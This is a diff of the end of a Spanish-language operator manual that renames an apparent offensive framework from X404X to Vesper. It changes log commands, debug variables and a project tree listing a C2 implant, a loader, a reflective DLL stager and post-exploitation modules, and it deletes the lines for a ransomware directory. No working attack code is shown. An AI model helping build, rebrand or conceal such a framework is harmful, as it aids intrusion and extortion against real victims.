-docker logs -f x404x_test_runner
+docker logs -f vesper_test_runner
 ```
 
 ### 15.3 Modo Verbose
 
 ```bash
 # Activar debug en todos los componentes
-export X404X_DEBUG=1
+export VESPER_DEBUG=1
 
 # Niveles: 1 (info), 2 (debug), 3 (trace)
-export X404X_LOG_LEVEL=3
+export VESPER_LOG_LEVEL=3
 ```
 
 ---
@@ -1338,16 +1317,14 @@ export X404X_LOG_LEVEL=3
 ### 16.1 Estructura del Proyecto
 
 ```
-X404X/
+Vesper/
 ├── cmd/                           CLI + agente implant
-│   ├── x404x/                     Shell interactiva
+│   ├── vesper/                     Shell interactiva
 │   └── implant/                   Agente C2 Go
 ├── internal/                      Core engine
-│   ├── ransomware/                37 archivos
 │   │   ├── hydra_vectors/         8 vectores
 │   │   ├── loader/                Cross-platform
 │   │   ├── stager/                Reflective DLL
-│   │   └── v27/, v29/, v210/      Versiones avanzadas
 │   ├── agent/                     Post-explotación
 │   ├── appstate/                  FSM + AI orchestrator
 │   ├── bridge/                    Wazero WASM bridge
@@ -1390,4 +1367,4 @@ X404X/
 
 ---
 
-*X404X v3.0 — Manual Operacional Completo — 2026*
+*Vesper v3.0 — Manual Operacional Completo — 2026*
